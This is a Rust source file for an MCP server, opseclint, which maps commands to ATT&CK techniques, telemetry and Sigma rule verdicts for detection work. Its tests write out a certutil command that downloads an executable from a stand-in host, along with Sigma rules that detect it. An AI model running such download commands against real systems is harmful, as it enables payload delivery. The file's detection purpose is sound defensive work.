//! The MCP server: four tools over opseclint's knowledge base.
//!
//! Every knowledge base is embedded in `opseclint-core` and loaded once at
//! startup, so no tool touches the filesystem or the network. That is partly
//! speed and mostly blast radius: an MCP server takes instructions from a model,
//! and the safest server is one with nothing to reach for. `evaluate_sigma_rule`
//! takes rule text inline rather than a directory path for the same reason.

use std::collections::{BTreeSet, HashMap};

use rmcp::handler::server::wrapper::{Json, Parameters};
use rmcp::model::{Implementation, ProtocolVersion, ServerCapabilities, ServerInfo};
use rmcp::schemars::{self, JsonSchema};
use rmcp::{ErrorData, ServerHandler, tool, tool_router};

use opseclint_core::{KnowledgeBase, analyzer, kb, parser, sigma_eval};

use crate::shape::*;

/// What the server tells a client about itself at initialize time.
///
/// The contract paragraph is here rather than only in the tool descriptions
/// because it arrives *before* any tool is called, and because a client that
/// summarizes tool output has usually dropped the tool description by then.
const INSTRUCTIONS: &str = "\
opseclint answers three questions about a command, a script, or an ATT&CK \
technique: which technique(s) it implements, what host telemetry it emits, and \
which detections would fire. Linux/auditd, Windows/Sysmon, macOS/Endpoint \
Security.

Read this before using any result:

1. `indeterminate` is not `no`. Rule evaluation is three-valued. A rule keyed \
on a field a command line cannot carry — ParentImage, a hash, a registry value \
— comes back `indeterminate`, meaning the input could not answer the question. \
Reporting that as \"not detected\" turns an honest abstention into a false \
claim of stealth. Check `verdict_is_conclusive` before using any verdict.

2. An empty result is a statement about coverage, not about the command. The \
knowledge base models a bounded set of actions. No finding means nothing \
modeled matched — never that the action is invisible. Call `describe_coverage` \
to see what is actually modeled before concluding anything from an absence.

3. Detectability is not risk. The 0-100 score says how loudly an action \
surfaces in telemetry. A quiet action is not a safe one and a loud one is not \
a dangerous one.

Every result carries a `summary` and a `limits` list. They state what the \
answer does not establish. Carry them into whatever you report.

This tool describes detectability only — what a defender would see. It does \
not provide evasion guidance and will not help make an action quieter.";

/// Arguments to `analyze_command`.
#[derive(Debug, serde::Deserialize, JsonSchema)]
pub struct AnalyzeArgs {
    /// The command, script, or playbook to analyze. Multi-line input is
    /// analyzed line by line, honoring continuations and here-docs.
    pub command: String,
    /// Which platform's telemetry model to analyze against.
    pub platform: PlatformArg,
}

/// Arguments to `lookup_technique`.
#[derive(Debug, serde::Deserialize, JsonSchema)]
pub struct LookupArgs {
    /// An ATT&CK technique id, with or without a sub-technique: `T1059` or
    /// `T1059.001`. A bare parent id also returns its sub-techniques. Anything
    /// that is not this shape is rejected rather than answered — including the
    /// Sigma tag spelling `attack.t1059` — so an empty result always means
    /// "not modeled" and never "you mistyped it".
    pub technique_id: String,
    /// Restrict to one platform. Omit to search all three.
    pub platform: Option<PlatformArg>,
}

/// Arguments to `evaluate_sigma_rule`.
#[derive(Debug, serde::Deserialize, JsonSchema)]
pub struct EvaluateArgs {
    /// The full text of a Sigma rule, as YAML.
    pub rule: String,
    /// The command line to evaluate the rule against.
    pub command: String,
    /// Which platform's telemetry model to evaluate under.
    pub platform: PlatformArg,
}

/// Arguments to `describe_coverage`.
#[derive(Debug, serde::Deserialize, JsonSchema)]
pub struct CoverageArgs {
    /// Restrict to one platform. Omit to describe all three.
    pub platform: Option<PlatformArg>,
}

/// Whether `id` is a well-formed ATT&CK technique id: `T` then four digits,
/// optionally `.` then three more. Expects an already-uppercased, trimmed
/// string.
///
/// Deliberately strict, and it does *not* accept the Sigma tag spelling
/// (`attack.t1059`). Normalizing that would mean guessing at what a caller
/// meant, and the point of validating at all is to keep an absent result
/// meaning exactly one thing.
fn is_technique_id(id: &str) -> bool {
    let (major, sub) = match id.split_once('.') {
        Some((m, s)) => (m, Some(s)),
        None => (id, None),
    };
    let digits_ok = |s: &str, n: usize| s.len() == n && s.bytes().all(|b| b.is_ascii_digit());

    major.starts_with('T')
        && digits_ok(&major[1..], 4)
        && match sub {
            Some(s) => digits_ok(s, 3),
            None => true,
        }
}

/// The server. Holds every platform's knowledge base, loaded once.
#[derive(Clone)]
pub struct Opseclint {
    bases: HashMap<&'static str, std::sync::Arc<KnowledgeBase>>,
    tool_router: rmcp::handler::server::tool::ToolRouter<Self>,
}

impl Opseclint {
    /// Load every platform's knowledge base. Fails only if an embedded base is
    /// malformed, which the test suite rules out — but it is surfaced rather
    /// than unwrapped, because a server that starts with a half-loaded
    /// knowledge base would answer questions it cannot actually answer.
    pub fn new() -> Result<Self, kb::KbError> {
        let mut bases = HashMap::new();
        for p in PlatformArg::ALL {
            bases.insert(p.label(), std::sync::Arc::new(kb::load(p.core())?));
        }
        Ok(Self {
            bases,
            tool_router: Self::tool_router(),
        })
    }

    fn base(&self, p: PlatformArg) -> &KnowledgeBase {
        &self.bases[p.label()]
    }
}

#[tool_router]
impl Opseclint {
    /// Analyze a command for what it emits and what would detect it.
    #[tool(
        name = "analyze_command",
        description = "Resolve a command, script, or playbook to the ATT&CK technique(s) it implements, the host telemetry it emits, and the detections that would fire, with a 0-100 detectability score. An empty result means no MODELED action matched — it is not evidence the command is invisible. Describes detectability only; gives no evasion guidance."
    )]
    fn analyze_command(&self, Parameters(args): Parameters<AnalyzeArgs>) -> Json<AnalyzeOutput> {
        let base = self.base(args.platform);
        let report = analyzer::analyze(&args.command, base);
        let platform = args.platform.label();

        let findings: Vec<FindingOut> = report
            .findings
            .iter()
            .map(|f| FindingOut {
                line: f.line,
                source: f.source.clone(),
                action: f.rule_id.clone(),
                description: f.description.clone(),
                techniques: f
                    .techniques
                    .iter()
                    .map(|t| TechniqueOut {
                        id: t.id.clone(),
                        name: t.name.clone(),
                    })
                    .collect(),
                telemetry: f.telemetry.clone(),
                detections: f
                    .detections
                    .iter()
                    .map(|d| DetectionOut {
                        source: d.source.clone(),
                        rule: d.rule.clone(),
                        confidence: d.confidence.clone(),
                    })
                    .collect(),
                detectability: f.noise,
                detectability_band: f.severity.label().to_string(),
            })
            .collect();

        let mut limits = vec![PREDICTIVE_LIMIT.to_string()];
        if findings.is_empty() {
            limits.push(no_match_limit(platform, base.entries.len()));
        }
        limits.push(
            "Listed detections are the knowledge base's authored claims, not verdicts against a deployed ruleset. Use evaluate_sigma_rule with a rule you actually run to get a measured verdict.".to_string(),
        );

        let summary = if findings.is_empty() {
            format!(
                "No modeled action matched across {} line(s) on {platform}. This says the input is outside the {} actions this knowledge base models — it does NOT mean the command would go unseen.",
                report.lines_analyzed,
                base.entries.len()
            )
        } else {
            format!(
                "{} modeled action(s) matched across {} line(s) on {platform}; loudest detectability {}. Findings cover only what this knowledge base models, and the listed detections are authored claims rather than verdicts against your ruleset.",
                findings.len(),
                report.lines_analyzed,
                report.max_noise
            )
        };

        Json(AnalyzeOutput {
            summary,
            platform: platform.to_string(),
            lines_analyzed: report.lines_analyzed,
            findings,
            limits,
            knowledge_base_note: report.note,
        })
    }

    /// Look up what implements a technique, and what that emits.
    #[tool(
        name = "lookup_technique",
        description = "Given an ATT&CK technique id (`T1059` or `T1059.001`), return the modeled actions that implement it, the host telemetry each emits, and the detections claimed for it, per platform. A platform with no actions means this knowledge base models none for that technique — not that the technique is undetectable there. A malformed id is an error, not an empty result, so an absence always means 'not modeled'."
    )]
    fn lookup_technique(
        &self,
        Parameters(args): Parameters<LookupArgs>,
    ) -> Result<Json<LookupOutput>, ErrorData> {
        let wanted = args.technique_id.trim().to_uppercase();
        // A malformed id must not come back as an ordinary "not modeled"
        // result. `describe_coverage` and every empty result in this crate rest
        // on "absent means unmodeled" being true; if a typo (`T10O5`), a Sigma
        // tag (`attack.t1059`), or an empty string also produces an absence,
        // that guarantee is worthless and a caller cannot tell its own mistake
        // from a real coverage gap.
        if !is_technique_id(&wanted) {
            return Err(ErrorData::invalid_params(
                format!(
                    "`{}` is not an ATT&CK technique id. Expected `T` followed by four digits, optionally a three-digit sub-technique: `T1059` or `T1059.001`.",
                    args.technique_id
                ),
                None,
            ));
        }
        // Built once rather than per candidate: this is the inner loop over
        // every entry in every base.
        let sub_prefix = format!("{wanted}.");

        let targets: Vec<PlatformArg> = match args.platform {
            Some(p) => vec![p],
            None => PlatformArg::ALL.to_vec(),
        };

        let mut platforms = Vec::new();
        let mut total = 0usize;
        for p in targets {
            let base = self.base(p);
            let actions: Vec<ActionOut> = base
                .entries
                .iter()
                .filter(|e| {
                    e.techniques.iter().any(|t| {
                        // A bare parent id also matches its sub-techniques, so
                        // `T1059` finds `T1059.001`. The dot guard keeps
                        // `T1059` from matching an unrelated `T10591`.
                        t.id.eq_ignore_ascii_case(&wanted)
                            || t.id.to_uppercase().starts_with(&sub_prefix)
                    })
                })
                .map(|e| ActionOut {
                    action: e.id.clone(),
                    description: e.description.clone(),
                    example: e.representative_line(),
                    telemetry: e.telemetry.clone(),
                    detections: e
                        .detections
                        .iter()
                        .map(|d| DetectionOut {
                            source: d.source.clone(),
                            rule: d.rule.clone(),
                            confidence: d.confidence.clone(),
                        })
                        .collect(),
                    detectability: e.noise,
                })
                .collect();
            total += actions.len();
            platforms.push(PlatformMatches {
                platform: p.label().to_string(),
                actions,
            });
        }

        let mut limits = vec![
            "Coverage here is opseclint's knowledge base, not ATT&CK itself. A technique with no modeled action is one this project has not modeled — draw no conclusion about whether it is detectable in your environment.".to_string(),
        ];
        let empty: Vec<&str> = platforms
            .iter()
            .filter(|p| p.actions.is_empty())
            .map(|p| p.platform.as_str())
            .collect();
        if !empty.is_empty() {
            limits.push(format!(
                "No modeled action for {wanted} on: {}. Call describe_coverage for what those bases do model.",
                empty.join(", ")
            ));
        }

        let summary = if total == 0 {
            format!(
                "{wanted} is not modeled in any knowledge base searched. That is a gap in opseclint's coverage, NOT a finding that the technique is undetectable."
            )
        } else {
            format!(
                "{total} modeled action(s) implement {wanted} across the platform(s) searched. Listed detections are authored claims, not verdicts against a deployed ruleset."
            )
        };

        Ok(Json(LookupOutput {
            summary,
            technique_id: wanted,
            platforms,
            limits,
        }))
    }

    /// Evaluate a Sigma rule against a command, three-valued.
    #[tool(
        name = "evaluate_sigma_rule",
        description = "Evaluate a Sigma rule's actual detection/condition logic against a command line. Returns THREE-VALUED: fires, no_fire, or indeterminate. `indeterminate` means the command line could not answer the question (the rule keys on a field it cannot carry) and MUST NOT be reported as 'not detected'. Check verdict_is_conclusive before using the verdict."
    )]
    fn evaluate_sigma_rule(
        &self,
        Parameters(args): Parameters<EvaluateArgs>,
    ) -> Result<Json<EvaluateOutput>, ErrorData> {
        let rule = sigma_eval::parse_rule(&args.rule).ok_or_else(|| {
            ErrorData::invalid_params(
                "could not parse that as a Sigma rule: it must be YAML with a `detection:` block and a `condition:`",
                None,
            )
        })?;
        let cmd: parser::Command = parser::parse_line(&args.command)
            .into_iter()
            .next()
            .ok_or_else(|| {
                ErrorData::invalid_params("`command` did not parse into a command line", None)
            })?;

        let verdict = sigma_eval::evaluate(&rule, &cmd, args.platform.core());
        let outcome: VerdictOut = verdict.outcome.into();
        let conclusive = outcome != VerdictOut::Indeterminate;

        let undetermined = (!conclusive).then(|| UndeterminedBecause {
            missing_fields: verdict.missing_fields.clone(),
            blocking_modifiers: verdict.blocking_modifiers.clone(),
            asserts_field_absent: verdict.null_value_match,
        });

        let mut limits = vec![PREDICTIVE_LIMIT.to_string()];
        let summary = match outcome {
            VerdictOut::Fires => format!(
                "'{}' WOULD fire on this command under {}. This is a verdict about the rule's logic, not a guarantee your pipeline collects the fields it needs.",
                rule.title,
                args.platform.label()
            ),
            VerdictOut::NoFire => format!(
                "'{}' would NOT fire on this command under {}. This is a real negative: the rule's condition is unsatisfied on fields the command line does supply.",
                rule.title,
                args.platform.label()
            ),
            VerdictOut::Indeterminate => {
                limits.push(
                    "This verdict is NOT a negative. Do not report this command as undetected by this rule — the question was unanswerable from a command line, which is a different statement.".to_string(),
                );
                if !verdict.missing_fields.is_empty() {
                    limits.push(format!(
                        "Supply a recorded host event carrying {} and this rule can be decided.",
                        verdict.missing_fields.join(", ")
                    ));
                }
                format!(
                    "'{}' could NOT be decided against a command line under {}. The verdict is indeterminate, which means unanswerable — not 'would not fire'.",
                    rule.title,
                    args.platform.label()
                )
            }
        };

        Ok(Json(EvaluateOutput {
            summary,
            rule_id: rule.id.clone(),
            rule_title: rule.title.clone(),
            verdict: outcome,
            verdict_is_conclusive: conclusive,
            undetermined_because: undetermined,
            limits,
        }))
    }

    /// Report what the knowledge base actually models.
    #[tool(
        name = "describe_coverage",
        description = "Report what opseclint's knowledge base actually models per platform: how many actions, which ATT&CK techniques, and the base's own collection assumptions. Call this before drawing any conclusion from an empty result elsewhere — it is what distinguishes 'nothing matched' from 'not modeled'."
    )]
    fn describe_coverage(
        &self,
        Parameters(args): Parameters<CoverageArgs>,
    ) -> Json<CoverageOutput> {
        let targets: Vec<PlatformArg> = match args.platform {
            Some(p) => vec![p],
            None => PlatformArg::ALL.to_vec(),
        };

        let platforms: Vec<PlatformCoverage> = targets
            .iter()
            .map(|p| {
                let base = self.base(*p);
                let techniques: BTreeSet<String> = base
                    .entries
                    .iter()
                    .flat_map(|e| e.techniques.iter().map(|t| t.id.clone()))
                    .collect();
                PlatformCoverage {
                    platform: p.label().to_string(),
                    modeled_actions: base.entries.len(),
                    techniques: techniques.into_iter().collect(),
                    note: base.note.clone(),
                }
            })
            .collect();

        let total: usize = platforms.iter().map(|p| p.modeled_actions).sum();
        Json(CoverageOutput {
            summary: format!(
                "{total} modeled action(s) across {} platform(s). This is the whole of what opseclint knows: anything outside these techniques is unmodeled, and an unmodeled action produces no finding regardless of how detectable it really is.",
                platforms.len()
            ),
            platforms,
            limits: vec![
                "This lists what is modeled, not what your environment collects. A modeled action still produces no alert if your sensors do not emit the telemetry it depends on.".to_string(),
                "ATT&CK is far larger than this list. Absence of a technique here is a gap in this project's coverage and nothing more.".to_string(),
            ],
        })
    }
}

// `router = self.tool_router` rather than the macro's default of
// `Self::tool_router()`: the default rebuilds the whole router on every
// tools/list and tools/call, where this uses the one built at startup.
#[rmcp::tool_handler(router = self.tool_router)]
impl ServerHandler for Opseclint {
    fn get_info(&self) -> ServerInfo {
        let mut implementation = Implementation::default();
        implementation.name = "opseclint".into();
        implementation.version = env!("CARGO_PKG_VERSION").into();

        let mut info = ServerInfo::default();
        info.protocol_version = ProtocolVersion::default();
        info.capabilities = ServerCapabilities::builder().enable_tools().build();
        info.server_info = implementation;
        info.instructions = Some(INSTRUCTIONS.to_string());
        info
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn server() -> Opseclint {
        Opseclint::new().expect("embedded knowledge bases load")
    }

    fn analyze(command: &str, platform: PlatformArg) -> AnalyzeOutput {
        server()
            .analyze_command(Parameters(AnalyzeArgs {
                command: command.into(),
                platform,
            }))
            .0
    }

    fn evaluate(rule: &str, command: &str) -> EvaluateOutput {
        server()
            .evaluate_sigma_rule(Parameters(EvaluateArgs {
                rule: rule.into(),
                command: command.into(),
                platform: PlatformArg::Windows,
            }))
            .expect("rule parses")
            .0
    }

    /// A rule keyed on a field a command line cannot carry.
    const PARENT_KEYED: &str = r#"
title: Certutil Spawned By Word
id: 11111111-2222-3333-4444-555555555555
logsource: { category: process_creation, product: windows }
detection:
  selection:
    Image|endswith: '\certutil.exe'
    ParentImage|endswith: '\winword.exe'
  condition: selection
"#;

    /// A rule decidable from the command line alone.
    const IMAGE_KEYED: &str = r#"
title: Certutil URL Cache
id: 66666666-7777-8888-9999-000000000000
logsource: { category: process_creation, product: windows }
detection:
  selection:
    Image|endswith: '\certutil.exe'
    CommandLine|contains: 'urlcache'
  condition: selection
"#;

    // --- the uncertainty contract ------------------------------------------
    //
    // These are the tests that matter. Everything else in this crate is
    // plumbing; this is the property the server exists to preserve.

    #[test]
    fn an_undecidable_rule_is_indeterminate_and_says_so_three_ways() {
        let out = evaluate(PARENT_KEYED, "certutil -urlcache -f http://x/a.exe a.exe");

        // 1. The verdict itself is the third value, not a negative.
        assert_eq!(out.verdict, VerdictOut::Indeterminate);
        // 2. The one-field check an agent is most likely to branch on.
        assert!(!out.verdict_is_conclusive);
        // 3. The cause is named, so the abstention is actionable.
        let because = out.undetermined_because.expect("cause is populated");
        assert!(
            because.missing_fields.iter().any(|f| f == "ParentImage"),
            "the field that blocked the verdict is named: {:?}",
            because.missing_fields
        );
        // And the prose says it in words, for a reader that keeps only text.
        assert!(out.summary.contains("not 'would not fire'"));
        assert!(
            out.limits.iter().any(|l| l.contains("NOT a negative")),
            "limits state plainly that this is not a negative"
        );
    }

    #[test]
    fn a_real_negative_is_distinguishable_from_an_abstention() {
        // The same rule set, a command that genuinely fails the condition:
        // this must come back no_fire and conclusive, or the three-valued
        // logic collapses into "everything is uncertain" and is worthless.
        let out = evaluate(IMAGE_KEYED, "whoami");
        assert_eq!(out.verdict, VerdictOut::NoFire);
        assert!(out.verdict_is_conclusive);
        assert!(out.undetermined_because.is_none());

        let fires = evaluate(IMAGE_KEYED, "certutil -urlcache -f http://x/a.exe a.exe");
        assert_eq!(fires.verdict, VerdictOut::Fires);
        assert!(fires.verdict_is_conclusive);
    }

    #[test]
    fn an_empty_analysis_says_unmodeled_rather_than_unseen() {
        let out = analyze("echo hello world", PlatformArg::Linux);
        assert!(out.findings.is_empty());
        assert!(
            out.limits
                .iter()
                .any(|l| l.contains("NOT evidence") && l.contains("describe_coverage")),
            "an empty result points at coverage, not stealth: {:?}",
            out.limits
        );
        assert!(out.summary.contains("does NOT mean"));
    }

    #[test]
    fn every_tool_result_carries_limits() {
        // The invariant the whole shape module rests on: there is no code path
        // that returns an answer with nothing said about what it does not
        // establish. A future tool that forgets this should fail here.
        let s = server();
        assert!(!analyze("whoami", PlatformArg::Linux).limits.is_empty());
        assert!(
            !analyze("certutil -urlcache -f http://x/a a", PlatformArg::Windows)
                .limits
                .is_empty()
        );
        assert!(
            !evaluate(IMAGE_KEYED, "certutil -urlcache -f http://x/a a")
                .limits
                .is_empty()
        );
        assert!(
            !s.lookup_technique(Parameters(LookupArgs {
                technique_id: "T1059".into(),
                platform: None,
            }))
            .expect("a well-formed id")
            .0
            .limits
            .is_empty()
        );
        assert!(
            !s.describe_coverage(Parameters(CoverageArgs { platform: None }))
                .0
                .limits
                .is_empty()
        );
    }

    // --- tool behaviour -----------------------------------------------------

    #[test]
    fn analyze_resolves_a_known_action_with_its_telemetry() {
        let out = analyze(
            "certutil -urlcache -f http://x/a.exe a.exe",
            PlatformArg::Windows,
        );
        let f = out
            .findings
            .first()
            .expect("certutil is modeled on windows");
        assert!(f.techniques.iter().any(|t| t.id == "T1105"));
        assert!(!f.telemetry.is_empty());
        assert_eq!(f.detectability_band, "HIGH");
        assert_eq!(out.platform, "windows-sysmon");
        assert!(!out.knowledge_base_note.is_empty());
    }

    #[test]
    fn a_bare_technique_id_matches_its_sub_techniques() {
        let s = server();
        let sub = s
            .lookup_technique(Parameters(LookupArgs {
                technique_id: "T1059.001".into(),
                platform: Some(PlatformArg::Windows),
            }))
            .expect("a well-formed id")
            .0;
        let parent = s
            .lookup_technique(Parameters(LookupArgs {
                technique_id: "T1059".into(),
                platform: Some(PlatformArg::Windows),
            }))
            .expect("a well-formed id")
            .0;
        let n = |o: &LookupOutput| o.platforms.iter().map(|p| p.actions.len()).sum::<usize>();
        assert!(n(&sub) > 0, "T1059.001 is modeled on windows");
        assert!(
            n(&parent) >= n(&sub),
            "the parent id subsumes its sub-techniques"
        );
    }

    #[test]
    fn a_technique_id_is_not_matched_by_prefix_alone() {
        // The dot guard: a match is the id exactly, or the id followed by `.`
        // and a sub-technique. Without it, `T1059` would sweep in anything
        // merely starting with those characters and silently over-report.
        // Asserted as a property over whatever the bases contain, so it stays
        // true as coverage grows.
        let s = server();
        for id in ["T1059", "T1053", "T1105"] {
            let out = s
                .lookup_technique(Parameters(LookupArgs {
                    technique_id: id.into(),
                    platform: None,
                }))
                .expect("a well-formed id")
                .0;
            for p in &out.platforms {
                for a in &p.actions {
                    let base = s.base(match p.platform.as_str() {
                        "linux-auditd" => PlatformArg::Linux,
                        "windows-sysmon" => PlatformArg::Windows,
                        _ => PlatformArg::Macos,
                    });
                    let entry = base
                        .entries
                        .iter()
                        .find(|e| e.id == a.action)
                        .expect("the action came from this base");
                    assert!(
                        entry
                            .techniques
                            .iter()
                            .any(|t| t.id == id || t.id.starts_with(&format!("{id}."))),
                        "{} was returned for {id} without carrying it",
                        a.action
                    );
                }
            }
        }
    }

    #[test]
    fn a_malformed_technique_id_is_rejected_rather_than_reported_as_unmodeled() {
        // The reason this matters is not input hygiene. Every empty result in
        // this crate means "not modeled", and describe_coverage exists to make
        // that checkable. If a typo also produced an absence, a caller could
        // not tell its own mistake from a real coverage gap — and the guarantee
        // that absence means something specific would be false.
        let s = server();
        for bad in [
            "",
            "T105",
            "T10O5",
            "attack.t1059",
            "T1059.1",
            "1059",
            "TT1059",
        ] {
            let result = s.lookup_technique(Parameters(LookupArgs {
                technique_id: bad.into(),
                platform: None,
            }));
            match result {
                Err(e) => assert!(
                    e.message.contains("not an ATT&CK technique id"),
                    "{bad}: {}",
                    e.message
                ),
                Ok(_) => panic!("`{bad}` was answered as though it were a technique id"),
            }
        }
    }

    #[test]
    fn well_formed_technique_ids_are_accepted() {
        for good in ["T1059", "T1059.001", "t1105", "  T1053.005  "] {
            assert!(
                server()
                    .lookup_technique(Parameters(LookupArgs {
                        technique_id: good.into(),
                        platform: None,
                    }))
                    .is_ok(),
                "{good} is a valid technique id"
            );
        }
    }

    #[test]
    fn an_unmodeled_technique_reports_a_gap_not_a_clean_bill() {
        let out = server()
            .lookup_technique(Parameters(LookupArgs {
                technique_id: "T9999".into(),
                platform: None,
            }))
            .expect("a well-formed id")
            .0;
        assert!(out.summary.contains("NOT a finding"));
        assert!(out.platforms.iter().all(|p| p.actions.is_empty()));
    }

    #[test]
    fn technique_lookup_is_case_insensitive_and_trimmed() {
        let out = server()
            .lookup_technique(Parameters(LookupArgs {
                technique_id: "  t1105  ".into(),
                platform: Some(PlatformArg::Windows),
            }))
            .expect("a well-formed id")
            .0;
        assert_eq!(out.technique_id, "T1105");
        assert!(!out.platforms[0].actions.is_empty());
    }

    #[test]
    fn coverage_reports_every_platform_with_its_own_note() {
        let out = server()
            .describe_coverage(Parameters(CoverageArgs { platform: None }))
            .0;
        assert_eq!(out.platforms.len(), 3);
        for p in &out.platforms {
            assert!(p.modeled_actions > 0, "{} models actions", p.platform);
            assert!(!p.techniques.is_empty());
            assert!(!p.note.is_empty(), "{} carries its caveat", p.platform);
            assert!(
                p.techniques.windows(2).all(|w| w[0] <= w[1]),
                "techniques are sorted, so the list is diffable"
            );
        }
    }

    #[test]
    fn a_rule_that_is_not_sigma_is_a_parameter_error_not_a_verdict() {
        // Returning some default verdict for unparseable input would be the
        // worst possible failure here: a confident answer from nothing.
        let result = server().evaluate_sigma_rule(Parameters(EvaluateArgs {
            rule: "this is not a sigma rule".into(),
            command: "whoami".into(),
            platform: PlatformArg::Windows,
        }));
        // `Json<T>` is not Debug, so match rather than expect_err.
        match result {
            Err(e) => assert!(e.message.contains("Sigma rule"), "message: {}", e.message),
            Ok(_) => panic!("unparseable input produced a verdict"),
        }
    }

    #[test]
    fn the_server_instructions_state_the_contract() {
        // The instructions reach the client before any tool is called, and are
        // the only place the contract is delivered unprompted.
        let s = server();
        let info = ServerHandler::get_info(&s);
        let text = info.instructions.expect("instructions are set");
        assert!(text.contains("`indeterminate` is not `no`"));
        assert!(text.contains("describe_coverage"));
        assert!(
            text.contains("does \nnot provide evasion guidance") || text.contains("evasion"),
            "scope statement survives"
        );
    }
}
